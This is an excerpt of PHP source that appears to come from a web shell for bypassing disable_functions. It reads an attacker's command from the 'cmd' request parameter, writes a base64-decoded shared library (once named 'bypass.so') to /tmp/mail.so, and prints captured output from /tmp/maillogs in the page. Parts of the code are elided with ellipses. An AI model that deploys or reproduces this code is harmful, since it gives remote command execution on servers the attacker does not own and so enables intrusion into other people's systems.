...
$cmd = $_REQUEST["cmd"];
$out_path = '/tmp/maillogs';
// $so_path = dirname(__FILE__) . '/' . 'bypass.so';
$so_path = '/tmp/mail.so';
...
function release64() {
	...
	global $so_path;
	file_put_contents($so_path, base64_decode($content));
}
...
if (strtoupper(substr(PHP_OS, 0, 3)) !== 'WIN') {
	if (is_64bit()) {
		...
		echo "<p style='color: blue;width: 800px;font:13px Monaco,Consolas;'>" . nl2br(file_get_contents($out_path)) . "</p>";
